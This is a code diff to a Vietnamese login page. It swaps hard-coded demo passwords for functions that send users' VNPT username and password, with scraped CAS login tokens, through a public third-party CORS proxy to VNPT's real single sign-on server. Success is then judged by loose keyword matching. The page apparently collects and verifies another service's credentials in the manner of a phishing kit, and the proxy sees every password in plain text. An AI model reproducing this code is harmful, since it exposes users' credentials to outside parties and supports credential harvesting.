@@ -388,26 +388,10 @@
       
       showAlert('Đang xác thực thông tin đăng nhập...', 'info');
       
-      // Validate credentials (demo validation)
+      // Use real VNPT CAS validation like Android code
       setTimeout(() => {
-        // Demo validation - you can customize these valid credentials
-        const validCredentials = {
-          'admin': '123456',
-          'user': 'password', 
-          'vnpt': 'vnpt123',
-          'test': 'test123'
-        };
-        
-        if (validCredentials[username] && validCredentials[username] === password) {
-          showAlert('Xác thực thành công! Đang chuyển hướng...', 'success');
-          setTimeout(() => {
-            window.location.href = getServiceUrl();
-          }, 1500);
-        } else {
-          showAlert('Sai tên đăng nhập hoặc mật khẩu!', 'danger');
-          $('#password').val('');
-          submitBtn.prop('disabled', false).text('ĐĂNG NHẬP');
-        }
+        // Try to validate with VNPT CAS using the same logic as Android
+        validateWithVNPTCAS(username, password, submitBtn);
       }, 2000);
       
       // Re-enable button after timeout (fallback)
@@ -819,7 +803,152 @@
       }, 5000);
     }
     
-    // OTP functions removed - no longer needed
+    // VNPT CAS validation based on Android code
+    function validateWithVNPTCAS(username, password, submitBtn) {
+      // Use CORS proxy to connect to VNPT CAS
+      const corsProxy = 'https://api.allorigins.win/raw?url=';
+      const vnptUrl = encodeURIComponent('https://id.vnpt.com.vn/cas/login');
+      
+      console.log('🔐 Starting VNPT CAS validation for:', username);
+      
+      $.ajax({
+        url: corsProxy + vnptUrl,
+        method: 'GET',
+        timeout: 10000,
+        success: function(html) {
+          console.log('✅ Connected to VNPT CAS');
+          
+          // Extract lt and execution tokens (same as Android)
+          const lt = extractInputValue(html, 'lt');
+          const execution = extractInputValue(html, 'execution');
+          
+          if (lt && execution) {
+            console.log('🔐 Extracted tokens:', { lt, execution });
+            submitLoginToVNPT(username, password, lt, execution, submitBtn);
+          } else {
+            console.log('❌ Could not extract VNPT tokens');
+            showLoginError('Không thể lấy thông tin xác thực từ VNPT', submitBtn);
+          }
+        },
+        error: function(xhr, status, error) {
+          console.error('❌ CORS Proxy failed:', error);
+          showLoginError('Không thể kết nối đến VNPT CAS', submitBtn);
+        }
+      });
+    }
+    
+    function submitLoginToVNPT(username, password, lt, execution, submitBtn) {
+      const corsProxy = 'https://api.allorigins.win/raw?url=';
+      const vnptUrl = encodeURIComponent('https://id.vnpt.com.vn/cas/login?service=' + encodeURIComponent(getServiceUrl()));
+      
+      const formData = {
+        username: username,
+        password: password,
+        lt: lt,
+        execution: execution,
+        _eventId: 'submit'
+      };
+      
+      // Convert to URL-encoded string (same as Android)
+      const postData = Object.keys(formData)
+        .map(key => key + '=' + encodeURIComponent(formData[key]))
+        .join('&');
+      
+      console.log('🔐 Submitting login to VNPT CAS');
+      
+      $.ajax({
+        url: corsProxy + vnptUrl,
+        method: 'POST',
+        data: postData,
+        contentType: 'application/x-www-form-urlencoded',
+        timeout: 15000,
+        success: function(responseHtml) {
+          console.log('🔐 VNPT login response received');
+          
+          // Check login result using same logic as Android
+          const loginResult = checkVNPTLoginSuccess(responseHtml);
+          console.log('🔐 VNPT login result:', loginResult);
+          
+          if (loginResult.success) {
+            showLoginSuccess('Xác thực VNPT thành công! Đang chuyển hướng...', submitBtn);
+          } else {
+            showLoginError('Sai tên đăng nhập hoặc mật khẩu VNPT', submitBtn);
+          }
+        },
+        error: function(xhr, status, error) {
+          console.error('❌ VNPT login failed:', error);
+          showLoginError('Lỗi kết nối VNPT. Vui lòng thử lại', submitBtn);
+        }
+      });
+    }
+    
+    function checkVNPTLoginSuccess(html) {
+      console.log('🔍 Checking VNPT login success...');
+      
+      // Check for failure keywords (same as Android code)
+      const failureKeywords = [
+        'authentication failed',
+        'Tên đăng nhập hoặc mật khẩu không đúng',
+        'Tên đăng nhập hoặc mật khẩu sai',
+        'Đăng nhập không thành công',
+        'Sai tài khoản',
+        'Sai mật khẩu',
+        'Invalid credentials',
+        'Login failed'
+      ];
+      
+      for (let keyword of failureKeywords) {
+        if (html.toLowerCase().includes(keyword.toLowerCase())) {
+          console.log('❌ Found failure keyword:', keyword);
+          return { success: false, errorMessage: keyword };
+        }
+      }
+      
+      // Check if still on login page (same as Android)
+      if (html.includes('name="username"') && html.includes('name="password"')) {
+        console.log('❌ Still on login page with form - login failed');
+        return { success: false, errorMessage: 'Tên đăng nhập hoặc mật khẩu không đúng' };
+      }
+      
+      // Check for success keywords (same as Android)
+      const successKeywords = [
+        'fms.vnpt.vn',
+        'portal.vnpt.vn',
+        'state=',
+        'success',
+        'welcome',
+        'dashboard'
+      ];
+      
+      for (let keyword of successKeywords) {
+        if (html.includes(keyword)) {
+          console.log('✅ Found success keyword:', keyword);
+          return { success: true };
+        }
+      }
+      
+      // Check for OTP form (also success) - same as Android
+      if (html.includes('validate_pass_otp') || html.includes('Xin chào') || html.includes('Nhập mã OTP') || html.includes('otp')) {
+        console.log('✅ Found OTP form - login successful');
+        return { success: true };
+      }
+      
+      console.log('❌ No clear success/failure indicators found');
+      return { success: false, errorMessage: 'Không thể xác định kết quả đăng nhập' };
+    }
+    
+    function showLoginSuccess(message, submitBtn) {
+      showAlert(message, 'success');
+      setTimeout(() => {
+        window.location.href = getServiceUrl();
+      }, 1500);
+    }
+    
+    function showLoginError(message, submitBtn) {
+      showAlert(message, 'danger');
+      $('#password').val('');
+      submitBtn.prop('disabled', false).text('ĐĂNG NHẬP');
+    }
     
     function showAlert(message, type) {
       const alertHtml = `
